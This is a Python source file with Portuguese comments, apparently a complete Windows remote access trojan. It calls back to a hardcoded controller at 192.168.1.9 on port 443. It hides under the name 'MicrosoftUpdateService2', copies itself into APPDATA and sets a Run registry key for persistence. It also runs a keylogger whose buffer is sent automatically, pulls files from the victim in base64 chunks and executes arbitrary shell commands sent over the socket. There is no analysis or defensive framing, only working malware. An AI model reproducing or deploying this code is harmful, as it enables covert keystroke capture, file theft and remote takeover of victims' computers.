import datetime
import shutil
import socket
import sys
import subprocess
import os
import time
import winreg
import base64
from pynput import keyboard
from pathlib import Path

# --- CONFIGURAÇÕES ---
IP = "192.168.1.9"
PORT = 443
PROGRAM_NAME = "MicrosoftUpdateService2"
REGISTRY_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
MAX_BUFFER_SIZE = 500
CHUNK_SIZE = 16384  # 16KB para melhor performance

keylog_buffer = []
buffer_auto_send_pending = False
keylogger_active = False
listener = None

# --- MELHORIA: DOWNLOAD EM PEDAÇOS (CHUNKS) ---
def send_file_in_chunks(sock, filepath):
    try:
        if not os.path.exists(filepath):
            sock.send(b"[-] Erro: Arquivo nao encontrado.\n")
            return
            
        filename = Path(filepath).name
        filesize = os.path.getsize(filepath)
        
        # Envia cabeçalho para o servidor saber o que está vindo
        header = (f"[+] Iniciando download\n"
                  f"[i] Filename: {filename}\n"
                  f"[i] Size: {filesize} bytes\n"
                  f"[FILE-START]").encode()
        sock.send(header)

        # Envia o arquivo em pedaços de 16KB (Não trava a RAM)
        with open(filepath, 'rb') as f:
            while True:
                data = f.read(CHUNK_SIZE)
                if not data:
                    break
                # Envia o pedaço codificado em Base64
                sock.send(base64.b64encode(data))
        
        time.sleep(1) # Pequena pausa de segurança
        sock.send(b"[FILE-END]\n")
        
    except Exception as e:
        sock.send(f"[-] Erro no envio: {e}\n".encode())

# --- FUNÇÕES DO KEYLOGGER ---
def format_key(key):
    try: return key.char
    except AttributeError:
        special_keys = {keyboard.Key.space: ' ', keyboard.Key.enter: '[ENTER]', keyboard.Key.backspace: '[BACKSPACE]'}
        return special_keys.get(key, f'[{key.name.upper()}]')

def on_press(key):
    global keylog_buffer, buffer_auto_send_pending
    formatted = format_key(key)
    if formatted and len(keylog_buffer) < MAX_BUFFER_SIZE:
        keylog_buffer.append(formatted)
        if len(keylog_buffer) >= MAX_BUFFER_SIZE:
            buffer_auto_send_pending = True

def get_keylog_data():
    global keylog_buffer
    if not keylog_buffer: return '[i] keylog buffer is empty'
    data = f"[+] keylog captured:\n{''.join(keylog_buffer)}\n"
    keylog_buffer = []
    return data 

def start_keylogger():
    global listener, keylogger_active
    if keylogger_active: return "[i] keylogger is already running"
    listener = keyboard.Listener(on_press=on_press); listener.start()
    keylogger_active = True
    return "[+] keylogger started"

# --- PERSISTÊNCIA ---
def check_persistence():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_KEY_PATH, 0, winreg.KEY_READ)
        winreg.QueryValueEx(key, PROGRAM_NAME); winreg.CloseKey(key)
        return True
    except: return False

def setup_persistence():
    try:
        appdata_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows')
        dest = os.path.join(appdata_path, f'{PROGRAM_NAME}.exe')
        if os.path.abspath(sys.executable) != os.path.abspath(dest):
            shutil.copy2(sys.executable, dest)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_KEY_PATH, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, PROGRAM_NAME, 0, winreg.REG_SZ, dest)
        winreg.CloseKey(key)
        return True
    except: return False

# --- COMANDOS E COMUNICAÇÃO ---
def cmd(c, data):
    try:
        if data.startswith("cd"):
            os.chdir(data[3:].strip())
            c.send(f"[i] Dir: {os.getcwd()}\n".encode())
        
        elif data == "/persistence status":
            status = "ATIVO" if check_persistence() else "INATIVO"
            c.send(f"[i] Persistencia: {status}\n".encode())

        elif data == "/persistence setup":
            setup_persistence()
            c.send(b"[+] Persistencia configurada\n")

        elif data.startswith("/download "):
            filepath = data[10:].strip().replace('"', '')
            send_file_in_chunks(c, filepath)

        elif data == "/keylog start":
            c.send(start_keylogger().encode() + b"\n")
            
        elif data == "/keylog dump":
            c.send(get_keylog_data().encode() + b"\n")

        elif data == "/exit":
            c.close(); sys.exit()

        else: # Shell commands genéricos
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            if not output: output = b"[i] Comando executado (sem retorno)\n"
            c.send(output)
    except Exception as e:
        c.send(f"[-] Erro: {e}\n".encode())

def listen(c):
    global buffer_auto_send_pending
    while True:
        try:
            if buffer_auto_send_pending:
                c.send(f"[AUTO-SEND] {get_keylog_data()}\n".encode())
                buffer_auto_send_pending = False
            
            c.settimeout(1.0)
            raw_data = c.recv(CHUNK_SIZE)
            if not raw_data: break
            
            data = raw_data.decode(errors='ignore').strip()
            if data:
                cmd(c, data)
        except socket.timeout: continue
        except: break

if __name__ == "__main__":
    while True: # Mantém o programa tentando conectar sempre
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((IP, PORT))
            client.send(f"[#] Conectado: {os.getlogin()}\n".encode())
            listen(client)
        except:
            time.sleep(20) # Se cair, tenta de novo em 20 seg
